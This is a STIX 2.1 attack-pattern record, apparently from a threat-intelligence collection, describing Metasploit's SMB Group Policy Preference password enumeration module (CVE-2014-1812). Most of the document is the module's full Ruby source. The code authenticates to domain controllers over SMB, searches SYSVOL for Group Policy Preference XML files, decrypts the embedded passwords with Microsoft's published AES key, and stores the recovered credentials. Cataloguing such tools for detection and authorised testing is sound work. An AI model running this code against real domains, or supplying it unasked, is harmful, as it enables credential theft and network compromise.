{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bca41b7a-8071-436d-90c0-e447a2994762",
    "created": "2024-08-14T16:31:15.192588Z",
    "modified": "2024-08-14T16:31:15.192592Z",
    "name": "SMB Group Policy Preference Saved Passwords Enumeration",
    "description": "Q This module enumerates files from target domain controllers and connects to them via SMB. It then looks for Group Policy Preference XML files containing local/domain user accounts and passwords and decrypts them using Microsoft's public AES key. This module has been tested successfully on a Win2k8 R2 Domain Controller. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/smb/smb_enum_gpp.rb",
            "external_id": "smb_enum_gpp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1812"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4"
        },
        {
            "source_name": "reference",
            "url": "http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  # Aliases for common classes\n  SIMPLE = Rex::Proto::SMB::Client\n  XCEPT  = Rex::Proto::SMB::Exceptions\n  CONST  = Rex::Proto::SMB::Constants\n\n  def initialize\n    super(\n      'Name'        => 'SMB Group Policy Preference Saved Passwords Enumeration',\n      'Description' => %Q{\n        This module enumerates files from target domain controllers and connects to them via SMB.\n        It then looks for Group Policy Preference XML files containing local/domain user accounts\n        and passwords and decrypts them using Microsoft's public AES key. This module has been\n        tested successfully on a Win2k8 R2 Domain Controller.\n      },\n      'Author'      =>\n        [\n          'Joshua D. Abraham <jabra[at]praetorian.com>',\n        ],\n      'References'    =>\n        [\n          ['CVE', '2014-1812'],\n          ['MSB', 'MS14-025'],\n          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4'],\n          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],\n          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],\n          ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']\n        ],\n      'License'     => MSF_LICENSE\n    )\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),\n      OptPort.new('RPORT', [true, 'The Target port', 445]),\n      OptBool.new('STORE', [true, 'Store the enumerated files in loot.', true])\n    ])\n  end\n\n  def check_path(ip, path)\n    vprint_status(\"Trying to download \\\\\\\\#{ip}\\\\#{path}...\")\n    begin\n      fd = simple.open(path, 'ro')\n      print_good \"Found Policy Share on #{ip}\"\n      smb_download(ip, fd, path)\n    rescue ::RubySMB::Error::UnexpectedStatusCode => e\n      case e.status_code.name\n      when 'STATUS_FILE_IS_A_DIRECTORY'\n        print_good(\"Directory FOUND: \\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}\\\\#{path}\")\n      when 'STATUS_OBJECT_NAME_NOT_FOUND'\n        vprint_error(\"Object \\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}\\\\#{path} NOT found!\")\n      when 'STATUS_OBJECT_PATH_NOT_FOUND'\n        vprint_error(\"Object PATH \\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}\\\\#{path} NOT found!\")\n      when 'STATUS_ACCESS_DENIED'\n       vprint_error(\"Host reports access denied.\")\n      when 'STATUS_BAD_NETWORK_NAME'\n        vprint_error(\"Host is NOT connected to #{datastore['SMBDomain']}!\")\n      when 'STATUS_INSUFF_SERVER_RESOURCES'\n        vprint_error(\"Host rejected with insufficient resources!\")\n      when 'STATUS_OBJECT_NAME_INVALID'\n        vprint_error(\"opening #{path.inspect} bad filename\")\n      else\n        vprint_error(\"Server responded unexpected status code: #{e.status_code.name.inspect}\")\n      end\n    ensure\n      fd.close unless fd.nil?\n    end\n  end\n\n  def report_creds(ip, user, password)\n    service_data = {\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      service_name: 'smb',\n      workspace_id: myworkspace_id\n    }\n\n    new_user = user.sub(/\\s+.*/, '')\n    first, rest = new_user.split(/\\\\/)\n    if first && rest\n      domain = first\n      user = rest\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user,\n        private_data: password,\n        private_type: :password,\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: domain,\n      }\n    else\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: new_user,\n        private_data: password,\n        private_type: :password\n      }\n    end\n    credential_core = create_credential(credential_data.merge(service_data))\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }\n\n    create_credential_login(login_data.merge(service_data))\n  end\n\n  def parse_xml(ip, path, xml_file)\n    mxml = xml_file[:xml]\n    print_status \"Parsing file: \\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}\\\\#{path}\"\n    file_type = File.basename(xml_file[:path].gsub(\"\\\\\",\"/\"))\n    results = Rex::Parser::GPP.parse(mxml)\n    tables = Rex::Parser::GPP.create_tables(results, file_type, xml_file[:domain], xml_file[:dc])\n\n    tables.each do |table|\n      print_good(table.to_s)\n    end\n\n    results.each do |result|\n      if datastore['STORE']\n        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', ip, xml_file[:xml], file_type, xml_file[:path])\n        print_good(\"XML file saved to: #{stored_path}\")\n      end\n\n      report_creds(ip, result[:USER], result[:PASS])\n    end\n  end\n\n  def smb_download(ip, fd, path)\n    vprint_status(\"Downloading #{path}...\")\n\n    data = fd.read\n\n    path_elements = path.split('\\\\')\n    ret_obj = {\n      :dc   => ip,\n      :path => path,\n      :xml  => data\n    }\n    ret_obj[:domain] = path_elements[0]\n\n    parse_xml(ip, path, ret_obj) if ret_obj\n\n    fname = path.split(\"\\\\\")[-1]\n\n    if datastore['STORE']\n      path = store_loot('smb.shares.file', 'application/octet-stream', ip, data, fname)\n      print_good(\"#{fname} saved as: #{path}\")\n    end\n  end\n\n  def run_host(ip)\n    print_status('Connecting to the server...')\n    begin\n      connect\n      smb_login\n      print_status(\"Mounting the remote share \\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}'...\")\n      tree = simple.client.tree_connect(\"\\\\\\\\#{ip}\\\\#{datastore['SMBSHARE']}\")\n\n      corp_domain = tree.list.map { |entry| entry.file_name.value.to_s.encode }.detect { |entry| entry != '.' && entry != '..' }\n      fail_with(Failure::NotFound, 'Could not find the domain folder') if corp_domain.nil?\n\n      sub_folders = tree.list(directory: \"#{corp_domain}\\\\Policies\").map { |entry| entry.file_name.value.to_s.encode }\n\n      gpp_locations = %w(\n        MACHINE\\\\Preferences\\\\Groups\\\\Groups.xml\n        USER\\\\Preferences\\\\Groups\\\\Groups.xml\n        MACHINE\\\\Preferences\\\\Services\\\\Services.xml\n        USER\\\\Preferences\\\\Printers\\\\Printers.xml\n        USER\\\\Preferences\\\\Drives\\\\Drives.xml\n        MACHINE\\\\Preferences\\\\Datasources\\\\DataSources.xml\n        USER\\\\Preferences\\\\Datasources\\\\DataSources.xml\n        MACHINE\\\\Preferences\\\\ScheduledTasks\\\\ScheduledTasks.xml\n        USER\\\\Preferences\\\\ScheduledTasks\\\\ScheduledTasks.xml\n      )\n      sub_folders.each do |sub_folder|\n        next if sub_folder == '.' || sub_folder == '..'\n        gpp_locations.each do |gpp_l|\n          check_path(ip,\"#{corp_domain}\\\\Policies\\\\#{sub_folder}\\\\#{gpp_l}\")\n        end\n      end\n    rescue ::Exception => e\n      print_error(\"#{rhost}: #{e.class} #{e}\")\n    ensure\n      disconnect\n    end\n  end\nend\n"
}